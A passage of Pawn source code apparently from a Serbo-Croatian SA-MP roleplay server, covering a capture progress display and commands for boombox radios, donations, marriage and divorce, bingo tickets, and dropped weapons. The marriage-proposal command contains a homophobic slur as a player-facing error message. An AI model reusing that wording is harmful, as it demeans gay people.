		PlayerTextDrawTextSize(playerid, Zauzimanje_pTD[playerid][0], 633.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, Zauzimanje_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, Zauzimanje_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, Zauzimanje_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, Zauzimanje_pTD[playerid][0], 117901462);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, Zauzimanje_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, Zauzimanje_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, Zauzimanje_pTD[playerid][0], 2);
		PlayerTextDrawSetProportional(playerid, Zauzimanje_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][0], 0);

		Zauzimanje_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 468.611267, 273.170989, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Zauzimanje_pTD[playerid][1], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Zauzimanje_pTD[playerid][1], 165.299285, 9.000000);
		PlayerTextDrawAlignment(playerid, Zauzimanje_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, Zauzimanje_pTD[playerid][1], 860593302);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, Zauzimanje_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, Zauzimanje_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, Zauzimanje_pTD[playerid][1], 4);
		PlayerTextDrawSetProportional(playerid, Zauzimanje_pTD[playerid][1], 0);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][1], 0);

		Zauzimanje_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 527.744079, 274.926696, "ZAUZIMANJE U TOKU");
		PlayerTextDrawLetterSize(playerid, Zauzimanje_pTD[playerid][2], 0.162110, 0.573911);
		PlayerTextDrawAlignment(playerid, Zauzimanje_pTD[playerid][2], 3);
		PlayerTextDrawColor(playerid, Zauzimanje_pTD[playerid][2], -1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, Zauzimanje_pTD[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, Zauzimanje_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, Zauzimanje_pTD[playerid][2], 1);
		PlayerTextDrawSetProportional(playerid, Zauzimanje_pTD[playerid][2], 1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][2], 0);

		Zauzimanje_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 470.444427, 308.472961, "box");
		PlayerTextDrawLetterSize(playerid, Zauzimanje_pTD[playerid][3], 0.000000, 0.650443);
		PlayerTextDrawTextSize(playerid, Zauzimanje_pTD[playerid][3], 632.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, Zauzimanje_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, Zauzimanje_pTD[playerid][3], -1);
		PlayerTextDrawUseBox(playerid, Zauzimanje_pTD[playerid][3], 1);
		PlayerTextDrawBoxColor(playerid, Zauzimanje_pTD[playerid][3], 117901462);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, Zauzimanje_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, Zauzimanje_pTD[playerid][3], 255);
		PlayerTextDrawFont(playerid, Zauzimanje_pTD[playerid][3], 2);
		PlayerTextDrawSetProportional(playerid, Zauzimanje_pTD[playerid][3], 1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][3], 0);

		Zauzimanje_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 470.155761, 284.947601, "teammates_in_100m:_0");
		PlayerTextDrawLetterSize(playerid, Zauzimanje_pTD[playerid][4], 0.116663, 0.659021);
		PlayerTextDrawAlignment(playerid, Zauzimanje_pTD[playerid][4], 1);
		PlayerTextDrawColor(playerid, Zauzimanje_pTD[playerid][4], -1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, Zauzimanje_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, Zauzimanje_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, Zauzimanje_pTD[playerid][4], 2);
		PlayerTextDrawSetProportional(playerid, Zauzimanje_pTD[playerid][4], 1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][4], 0);

		Zauzimanje_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 587.977844, 286.064331, "600");
		PlayerTextDrawLetterSize(playerid, Zauzimanje_pTD[playerid][5], 0.300888, 1.336176);
		PlayerTextDrawAlignment(playerid, Zauzimanje_pTD[playerid][5], 1);
		PlayerTextDrawColor(playerid, Zauzimanje_pTD[playerid][5], -1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, Zauzimanje_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, Zauzimanje_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, Zauzimanje_pTD[playerid][5], 3);
		PlayerTextDrawSetProportional(playerid, Zauzimanje_pTD[playerid][5], 0);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][5], 0);

		Zauzimanje_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 613.822570, 296.557983, "do kraja");
		PlayerTextDrawLetterSize(playerid, Zauzimanje_pTD[playerid][6], 0.129666, 0.549022);
		PlayerTextDrawAlignment(playerid, Zauzimanje_pTD[playerid][6], 3);
		PlayerTextDrawColor(playerid, Zauzimanje_pTD[playerid][6], -1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, Zauzimanje_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, Zauzimanje_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, Zauzimanje_pTD[playerid][6], 2);
		PlayerTextDrawSetProportional(playerid, Zauzimanje_pTD[playerid][6], 1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][6], 0);

		Zauzimanje_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 470.044738, 290.841247, "DOZVOLJENA_UDALJENOST:_~r~10m~n~~w~Ako_se_previse_udaljite_zauzimanje_se_prekida!");
		PlayerTextDrawLetterSize(playerid, Zauzimanje_pTD[playerid][7], 0.087664, 0.608533);
		PlayerTextDrawAlignment(playerid, Zauzimanje_pTD[playerid][7], 1);
		PlayerTextDrawColor(playerid, Zauzimanje_pTD[playerid][7], -1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, Zauzimanje_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, Zauzimanje_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, Zauzimanje_pTD[playerid][7], 2);
		PlayerTextDrawSetProportional(playerid, Zauzimanje_pTD[playerid][7], 1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][7], 0);

		Zauzimanje_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 616.011413, 262.015411, "");
		PlayerTextDrawLetterSize(playerid, Zauzimanje_pTD[playerid][8], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Zauzimanje_pTD[playerid][8], 27.000000, 27.000000);
		PlayerTextDrawAlignment(playerid, Zauzimanje_pTD[playerid][8], 1);
		PlayerTextDrawColor(playerid, Zauzimanje_pTD[playerid][8], -1);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, Zauzimanje_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, Zauzimanje_pTD[playerid][8], 0);
		PlayerTextDrawFont(playerid, Zauzimanje_pTD[playerid][8], 5);
		PlayerTextDrawSetProportional(playerid, Zauzimanje_pTD[playerid][8], 0);
		PlayerTextDrawSetShadow(playerid, Zauzimanje_pTD[playerid][8], 0);
		PlayerTextDrawSetPreviewModel(playerid, Zauzimanje_pTD[playerid][8], 1313);
		PlayerTextDrawSetPreviewRot(playerid, Zauzimanje_pTD[playerid][8], 0.000000, 0.000000, 0.000000, 1.000000);

		ZauzimanjeBar_pTD[playerid] = CreatePlayerProgressBar(playerid, 471.00, 309.00, 160.50, 3.50, 1012446719, 100.0, BAR_DIRECTION_RIGHT);
		SetPlayerProgressBarValue( playerid, ZauzimanjeBar_pTD[playerid], 0.0 );
		ShowPlayerProgressBar( playerid, ZauzimanjeBar_pTD[playerid]);

		for( new i = 0; i < 9; i ++ ) PlayerTextDrawShow( playerid, Zauzimanje_pTD[ playerid ][ i ] );
	}
	else if( show == false )
	{
		for( new i = 0; i < 9; i ++)
		{
		    PlayerTextDrawHide( playerid, Zauzimanje_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, Zauzimanje_pTD[ playerid ][ i ] );
			Zauzimanje_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	    HidePlayerProgressBar(playerid, ZauzimanjeBar_pTD[ playerid ] );
	    DestroyPlayerProgressBar(playerid, ZauzimanjeBar_pTD[ playerid ] );
	    ZauzimanjeBar_pTD[ playerid ] = PlayerBar:INVALID_PLAYER_BAR_ID;
	}
}

CMD:radio( playerid, const params[] )
{
	new item[ 10 ];
	if( sscanf( params, "s[10] ", item ) )
	{
	    SendUsageMessage( playerid, "/radio [opcija]");
	    SendClientMessage( playerid, -1, "OPCIJE: postavi | podigni | url");
	    return 1;
	}
	if( strcmp( item, "postavi", true ) == 0 )
	{
		if(!PlayerInfo[playerid][xBoombox]) return SendErrorMessage(playerid, "Nemate radio.");
		if( BoomboxInfo[ playerid ][ boomboxPlaced ] ) return SendErrorMessage( playerid, "Vec ste postavili radio." );
		if( Boombox_Nearest( playerid ) != IPI ) return SendErrorMessage( playerid, "Vec ste u blizini drugog radia.");
		if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate napustiti vozilo prvo." );

        PlayerInfo[playerid][xBoombox] = false;
        sql_user_update_integer(playerid, "xBoombox", PlayerInfo[playerid][xBoombox]);

		Boombox_Place( playerid );

		SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s stavlja radio na pod i podesava ga.", ImeIgraca( playerid ) );
		SendClientMessage( playerid, ZUTA, "(RADIO): Postavili ste radio, ako ga ne pokupite izgubicete ga. Koristite \"/radio\" za opcije.");
    }
	else if( strcmp( item, "podigni", true ) == 0 )
	{
	    if( !BoomboxInfo[ playerid ][ boomboxPlaced ] ) return SendErrorMessage( playerid, "Nemate postavljen radio.");
		if( !IsPlayerInRangeOfPoint( playerid, 3.0, BoomboxInfo[ playerid ][ boomboxPos ][ 0 ], BoomboxInfo[ playerid ][ boomboxPos ][ 1 ], BoomboxInfo[ playerid ][ boomboxPos ][ 2 ] ) ) return SendErrorMessage( playerid, "Niste u blizini vaseg radia." );

		PlayerInfo[playerid][xBoombox] = true;
        sql_user_update_integer(playerid, "xBoombox", PlayerInfo[playerid][xBoombox]);
		Boombox_Destroy( playerid );

  		SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s je podiga%s svoj radio s poda.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"));
		return 1;
	}
	else if( strcmp( item, "url", true ) == 0 )
	{
	    new url[ 128 ];
	    if( sscanf( params, "s[10]s[128]", item, url ) ) return SendUsageMessage( playerid, "/radio url [song url]");
        if( !BoomboxInfo[ playerid ][ boomboxPlaced ] ) return SendErrorMessage( playerid, "Nemate postavljen radio.");
		if( !IsPlayerInRangeOfPoint( playerid, 3.0, BoomboxInfo[ playerid ][ boomboxPos ][ 0 ], BoomboxInfo[ playerid ][ boomboxPos ][ 1 ], BoomboxInfo[ playerid ][ boomboxPos ][ 2 ] ) ) return SendErrorMessage( playerid, "Niste u blizini vaseg radia.");

		Boombox_SetURL( playerid, url );
        SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s okrece kotacic na radiu te mjenja stanicu.", ImeIgraca( playerid ) );
		return 1;
	}
	else
	{
	    SendUsageMessage( playerid, "/radio [opcija]");
	    SendClientMessage( playerid, -1, "OPCIJE: postavi | podigni | url");
	}
	return 1;
}

CMD:donate( playerid )
{
	ShowPlayerDialog( playerid, dialog_DONATE, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																		"#\tOpcija\tOpis\n\
																		{4282C0}(1).\t{FFFFFF}LISTA DONACIJA\tPrikazuje listu stvari za koje se moze donirati\n\
																		{4282C0}(2).\t{FFFFFF}PAYPAL DONACIJA\tPrikazuje e adresu povezanu sa donacijama\n\
																		{4282C0}(3).\t{FFFFFF}XBON DONACIJA\tUkoliko ste kupili xBon, unesete kod\n\
																		{4282C0}(4).\t{FFFFFF}PAYSAFECARD DONACIJA\tUkoliko ste kupili PaySafeCard, unesete kod\n\
																		{4282C0}(5).\t{FFFFFF}SMS DONACIJA\tMogucnost donacije preko SMS-a", "Odaberi", "Odustani");
	return 1;
}

CMD:brojpotvrde( playerid )
{
	if(PlayerInfo[playerid][xBonPotvrda] == 0) return SendErrorMessage(playerid, "Nemate broj xbon potvrde");
	if(PlayerInfo[playerid][xPaysPotvrda] == 0) return SendErrorMessage(playerid, "Nemate broj PaySafe potvrde");

   	SendClientMessage(playerid, 0x4282C0FF, "_______________________________________________________________________________");
   	SendClientMessage(playerid, 0x4282C0FF, " ");
	SendInfoMessage(playerid, "Vas broj potvrde za XBON je: %d", PlayerInfo[playerid][xBonPotvrda]);
	SendInfoMessage(playerid, "Vas broj potvrde za PaySafeCard je: %d", PlayerInfo[playerid][xPaysPotvrda]);
   	SendClientMessage(playerid, 0x4282C0FF, "_______________________________________________________________________________");
	return 1;
}


CMD:razvedi( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/razvedi [id]" );
    if( id == IPI) return SendErrorMessage(playerid, "Pogresan ID Korisnika");

	SCMF(playerid, 0x33CCFFFF, "(BRAK): Razveli ste igraca {FFFFFF}%s.", ImeIgraca( id ) );
	SCMF(id, 0x33CCFFFF, "(BRAK): Admin {FFFFFF}%s {33CCFF}vas je razveo.", ImeIgraca( playerid ) );

	strmid( PlayerInfo[ id ][ xMarriedTo ], "Niko", 0, strlen( "Niko" ), 24 );
	PlayerInfo[ id ][ xMarried ] = 0;

	new q[ 144 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `married` = '%d', `married_to` = '%e' WHERE `user_id` = '%d' LIMIT 1",
										PlayerInfo[ id ][ xMarried ],
										PlayerInfo[ id ][ xMarriedTo ],
										PlayerInfo[ id ][ xID ] );
	mysql_tquery( mSQL, q );
	return 1;
}

CMD:zaprosi( playerid, const params[] )
{
	new id;
	if( sscanf(params, "u", id ) ) return SendUsageMessage( playerid, "/zaprosi [id]");
	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID.");
	if( PlayerInfo[ playerid ][ xNovac ] < 10000 ) return SendErrorMessage( playerid, "Trosak svadbe kosta 10.000$.");
	if( PlayerInfo[ playerid ][ xMarried ] != 0 ) return SendErrorMessage( playerid, "Vec si ozenjen/udata.");
	if( PlayerInfo[ id ][ xMarried ] != 0 ) return SendErrorMessage( playerid, "Vec je ozenjen/udata.");
    if( PlayerInfo[ playerid ][ xPol ] != 1 ) return SendErrorMessage( playerid, "Samo muski pol moze da zaprosi.");
	if( PlayerInfo[ id ][ xPol ] != 2 ) return SendErrorMessage( playerid, "Da li si peder?!");
	if( IsPlayerNearPlayer( 8.0, playerid, id ) )
	{
		if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe zaprosit!");

		SCMF( playerid, 0x33CCFFFF, "(BRAK): Zaprosili ste {FFFFFF}%s.", ImeIgraca( id ) );
		SCMF( id, 0x33CCFFFF, "(BRAK): {FFFFFF}%s {33CCFF}te zaprosio, pisi {FFFFFF}[ /accept marriage ] {33CCFF}da prihvatis brak.", ImeIgraca( playerid ) );

		ProposeOffer[ id ] = playerid;
	}
	else return SendErrorMessage( playerid, "Osoba se ne nalazi u vasoj blizini!" );
	return 1;
}

CMD:divorce( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xMarried ] == 0 ) return SendErrorMessage( playerid, "Nisi ozenjen/udana!");

	new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/divorce [id]");
    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID.");

	if( IsPlayerNearPlayer( 8.0, playerid, id ) )
	{
		if( id == playerid ) return SendErrorMessage( playerid, "Ne mozete se razvesti sami od sebe!");

		new dstring[ MAX_PLAYER_NAME ], wstring[ MAX_PLAYER_NAME ];
		strmid( wstring, ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 255 );
		strmid( dstring, PlayerInfo[ playerid ][ xMarriedTo ], 0, strlen( PlayerInfo[ playerid ][ xMarriedTo ] ), 255 );

		if( strcmp( dstring, wstring, true ) == 0 )
		{
			SCMF( playerid, 0x33CCFFFF, "(BRAK): Poslali ste papire za razvod {FFFFFF}%s.", ImeIgraca( id ) );
			SCMF( id, 0x33CCFFFF, "(BRAK): {FFFFFF}%s {33CCFF}poslao/la ti je papire za razvod, pisi {FFFFFF}[ /accept divorce ] {33CCFF}da prihvatis.", ImeIgraca( playerid ) );

		    DivorceOffer[ id ] = playerid;
		}
		else return SendErrorMessage( playerid, "Taj igrac nije vjencan za tebe!");
	}
	else return SendErrorMessage( playerid, "Osoba se ne nalazi u vasoj blizini!");
	return 1;
}

CMD:smsbingo( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xBingoNumber ] > 0 ) return SendErrorMessage( playerid, "Imate uplacen bingo listic.");
    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0 ) return SendErrorMessage( playerid, "Nemate mobilni telefon." );
    if( PlayerInfo[ playerid ][ xTelefonBon ] < 1000 ) return SendErrorMessage( playerid, "Nemate dovoljno kredita. Cena listica je 1000$." );

	new broj;
	if( sscanf( params, "d", broj ) ) return SendUsageMessage( playerid, "/smsbingo [broj]");
	if( broj < 1 || broj > 100 ) return SendErrorMessage( playerid, "Brojevi ne mogu da idu ispod 1 ili iznad 100." );

	PlayerInfo[ playerid ][ xBingoNumber ] = broj;
	sql_user_update_integer( playerid, "xBingoNumber", PlayerInfo[ playerid ][ xBingoNumber ] );

    SCMF( playerid, 0x4282C0FF, "(SMS BINGO): Uplatili ste tiket sa brojem {FFFFFF}(%d).", broj );
	SendClientMessage( playerid, 0x4282C0FF, "(SMS BINGO): Da vidite sve komande za bingo kucajte {FFFFFF}[ /help > Bingo ]." );

	new string[90];
	format(string, sizeof(string), "(UPLATA(SMS) BINGO): Netko je upravo uplatio tiket sa brojem {FFFFFF}(%d).", broj);
	SendClientMessageToAll(0x4282C0FF, string);

	PlayerInfo[ playerid ][ xTelefonBon ] -= 1000;
	BussinesLutrijaMoney( 1000 );
	return 1;
}

CMD:vbingo( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xVIPLevel ] < 5 ) return SendErrorMessage( playerid, "Niste ovlasceni." );
	if( PlayerInfo[ playerid ][ xBingoNumber ] > 0 ) return SendErrorMessage( playerid, "Imate uplacen bingo listic.");
	if( PlayerInfo[ playerid ][ xNovac ] < 100 ) return SendErrorMessage( playerid, "Nemate dovoljno novca. Cena listica je 100$." );

	new broj;
	if( sscanf( params, "d", broj ) ) return SendUsageMessage( playerid, "/vbingo [broj]");
	if( broj < 1 || broj > 100 ) return SendErrorMessage( playerid, "Brojevi ne mogu da idu ispod 1 ili iznad 100." );

	PlayerInfo[ playerid ][ xBingoNumber ] = broj;
	sql_user_update_integer( playerid, "xBingoNumber", PlayerInfo[ playerid ][ xBingoNumber ] );

    SCMF( playerid, 0x4282C0FF, "(VIP BINGO): Uplatili ste tiket sa brojem {FFFFFF}(%d).", broj );
	SendClientMessage( playerid, 0x4282C0FF, "(VIP BINGO): Da vidite sve komande za bingo kucajte {FFFFFF}[ /help > Bingo ]." );

	new string[90];
	format(string, sizeof(string), "(UPLATA(VIP) BINGO): Netko je upravo uplatio tiket sa brojem {FFFFFF}(%d).", broj);
	SendClientMessageToAll(0x4282C0FF, string);

	BussinesLutrijaMoney( 100 );
	return 1;
}

CMD:uplatibingo( playerid, const params[] )
{
	if( !IsPlayerInRangeOfPoint( playerid, 3, 1283.1431, -1542.3771, 13.5187 ) ) return SendErrorMessage( playerid, "Niste na salteru drzavne lutrije." );
	if( PlayerInfo[ playerid ][ xBingoNumber ] > 0 ) return SendErrorMessage( playerid, "Imate uplacen bingo listic.");
	if( PlayerInfo[ playerid ][ xNovac ] < 1000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca. Cena listica je 1000$." );

	new broj;
	if( sscanf( params, "i", broj ) ) return SendUsageMessage( playerid, "/uplatibingo [broj]");
	if( broj < 1 || broj > 100 ) return SendErrorMessage( playerid, "Brojevi ne mogu da idu ispod 1 ili iznad 100." );

	PlayerInfo[ playerid ][ xBingoNumber ] = broj;
	sql_user_update_integer( playerid, "xBingoNumber", PlayerInfo[ playerid ][ xBingoNumber ] );

    SCMF( playerid, 0x4282C0FF, "(BINGO): Uplatili ste tiket sa brojem {FFFFFF}(%d).", broj );
	SendClientMessage( playerid, 0x4282C0FF, "(BINGO): Da vidite sve komande za bingo kucajte {FFFFFF}[ /help > Bingo ]." );

	DajIgracuNovac( playerid, -1000 );
	BussinesLutrijaMoney( 1000 );

	new string[90];
	format(string, sizeof(string), "(UPLATA BINGO): Netko je upravo uplatio tiket sa brojem {FFFFFF}(%d).", broj);
	SendClientMessageToAll(0x4282C0FF, string);
	return 1;
}

CMD:mojtiket( playerid )
{
	if( PlayerInfo[ playerid ][ xBingoNumber ] == 0 ) return SendErrorMessage(playerid, "Nemate uplacen bingo listic." );
	SCMF( playerid, 0x4282C0FF, "(BINGO): Tvoj bingo broj je: {FFFFFF}(%d).", PlayerInfo[ playerid ][ xBingoNumber ] );
	return 1;
}

CMD:podignidobitak( playerid )
{
	if( !IsPlayerInRangeOfPoint( playerid, 3, 1283.1450, -1544.1130, 13.5306 ) ) return SendErrorMessage( playerid, "Niste na salteru drzavne lutrije." );
	if( PlayerInfo[ playerid ][ xBingoMoney ] < 1 ) return SendErrorMessage( playerid, "Trenutno nemate novca na bingo racunu." );

	DajIgracuNovac( playerid, PlayerInfo[ playerid ][ xBingoMoney ] );
	SendInfoMessage( playerid, "Preuzeli ste vasu nagradu od {FFFFFF}($%d).", PlayerInfo[ playerid ][ xBingoMoney ] );
	PlayerInfo[ playerid ][ xBingoMoney ] = 0;
	sql_user_update_integer( playerid, "xBingoMoney", PlayerInfo[ playerid ][ xBingoMoney ] );
	return 1;
}

CMD:dropgun( playerid )
{
	if( PlayerInfo[ playerid ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Morate biti level 2+ da bi mogli dropati oruzje." );
    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi bacili oruzje." );
	if( gettime() < DropedGun[ playerid ] ) return SendErrorMessage( playerid, "Morate sacekati jos %d sekundi da bi ponovo bacili oruzje.", DropedGun[ playerid ] - gettime());
	if( GetFactionType( playerid ) == ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "PD nema potrebe da koristi ovu komandu." );
	if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na CS:DM server." );
	if( WARPInfo[ playerid ][ WARIgrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes dok si u WARU." );
    if( tdm_player_info[ playerid ][ tdm_Team ] != 0 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na tdm eventu." );

	new GunID = GetWeapon( playerid ),
		GunAmmo = GetPlayerAmmo( playerid );
	if( GunID > 0 && GunAmmo != 0 )
	{
	    if( GetWeapon( playerid ) == GetPlayerWeapon( playerid ) )
		{
			new f = -1;
            for( new a = 0; a < MAX_GOBJ; a++ )
			{
                if( dGunData[ a ][ ObjPos ][ 0 ] == 0.0 )
				{
                    f = a;
                    break;
                }
            }
            if( f == -1 ) return SendErrorMessage( playerid, "Trenutno ne mozes baciti oruzje na pod." );
			RemovePlayerWeapon( playerid, GunID );

			dGunData[ f ][ ObjData ][ 0 ] = GunID;
			dGunData[ f ][ ObjData ][ 1 ] = GunAmmo;

			GetPlayerPos( playerid, dGunData[ f ][ ObjPos ][ 0 ], dGunData[ f ][ ObjPos ][ 1 ], dGunData[ f ][ ObjPos ][ 2 ] );
            dGunData[ f ][ gObjID ] = CreateDynamicObject( WeaponInfos[ GunID ][ wModel ], dGunData[ f ][ ObjPos ][ 0 ], dGunData[ f ][ ObjPos ][ 1 ], dGunData[ f ][ ObjPos ][ 2 ]-1, 93.7, 120.0, 120.0 );
            DropedGun[ playerid ] = gettime()+30;
			SCMF( playerid, 0x4282C0FF, "(DROP): Bacio si oruzje {FFFFFF}%s.", WeaponInfos[ dGunData[ f ][ ObjData ][ 0 ] ][ wName ] );
		}
    }
	return 1;
}

CMD:destroygun( playerid )
{
    if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");

    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Moras biti na nogama da bi bacio oruzje!");
	new f = -1;
	for( new a = 0; a < MAX_GOBJ; a++ )
	{
		if( IsPlayerInRangeOfPoint( playerid, 5.0, dGunData[ a ][ ObjPos ][ 0] , dGunData[ a ][ ObjPos ][ 1 ], dGunData[ a ][ ObjPos ][ 2 ] ) )
		{
			f = a;
		    break;
		}
	}
	if( f == -1 ) return SendErrorMessage( playerid, "Nemas oruzje u blizini." );
	DestroyDynamicObject( dGunData[ f ][ gObjID ] );

	SCMF( playerid, 0x4282C0FF, "(DESTROY): Unistio si oruzje {FFFFFF}%s.", WeaponInfos[ dGunData[ f ][ ObjData ][ 0 ] ][ wName ] );

	dGunData[ f ][ ObjPos ][ 0 ] = 0.0;
	dGunData[ f ][ ObjPos ][ 1 ] = 0.0;
	dGunData[ f ][ ObjPos ][ 2 ] = 0.0;
	dGunData[ f ][ gObjID ] = -1;
	dGunData[ f ][ ObjData ][ 0 ] = 0;
	dGunData[ f ][ ObjData ][ 1 ] = 0;
	return 1;
}

CMD:pickupgun( playerid )
{
    if( GetPlayerState(playerid) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Moras biti na nogama da bi bacio oruzje!");
    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na CS:DM server." );
	if( WARPInfo[ playerid ][ WARIgrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes dok si u WARU." );
    if( tdm_player_info[ playerid ][ tdm_Team ] != 0 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na tdm eventu." );

	new f = -1;
	for( new a = 0; a < MAX_GOBJ; a++ )
	{
		if( IsPlayerInRangeOfPoint( playerid, 5.0, dGunData[ a ][ ObjPos ][ 0] , dGunData[ a ][ ObjPos ][ 1 ], dGunData[ a ][ ObjPos ][ 2 ] ) )
		{
			f = a;
		    break;
		}
	}
	if( f == -1 ) return SendErrorMessage( playerid, "Nemas oruzje u blizini." );
	DestroyDynamicObject( dGunData[ f ][ gObjID ] );

	SCMF( playerid, 0x4282C0FF, "(PICKUP): Pokupio si oruzje {FFFFFF}%s.", WeaponInfos[ dGunData[ f ][ ObjData ][ 0 ] ][ wName ] );

	GiveWeaponToPlayer( playerid, dGunData[ f ][ ObjData ][ 0 ], dGunData[ f ][ ObjData ][ 1 ] );
	dGunData[ f ][ ObjPos ][ 0 ] = 0.0;
	dGunData[ f ][ ObjPos ][ 1 ] = 0.0;
	dGunData[ f ][ ObjPos ][ 2 ] = 0.0;
	dGunData[ f ][ gObjID ] = -1;
	dGunData[ f ][ ObjData ][ 0 ] = 0;
	dGunData[ f ][ ObjData ][ 1 ] = 0;
	return 1;
}

CMD:music( playerid )
{
	ShowPlayerDialog( playerid, dialog_RADIOPLAY, DIALOG_STYLE_LIST, D_NASLOV,
																				"{4282C0}(1). {FFFFFF}BUM Radio\n\
																				{4282C0}(2). {FFFFFF}B92 Radio\n\
																				{4282C0}(3). {FFFFFF}Antena Radio\n\
																				{4282C0}(4). {FFFFFF}Cool Radio\n\
																				{4282C0}(5). {FFFFFF}Naxi Radio\n\
																				{4282C0}(6). {FFFFFF}Radio BN\n\
																				{4282C0}(7). {FFFFFF}Radio Banovina\n\
																				{4282C0}(8). {FFFFFF}Balkan DJ\n\
																				{4282C0}(9). {FFFFFF}Radio - ULTIMATE\n\
																				{FF0000}- Off Radio", "Potvrdi", "Odustani" );
	return 1;
}
alias:music("mp3");

CMD:statistika( playerid )
{
	new coordsstring[ 100 ], srecnisati[ 20 ], happyjobs[15];

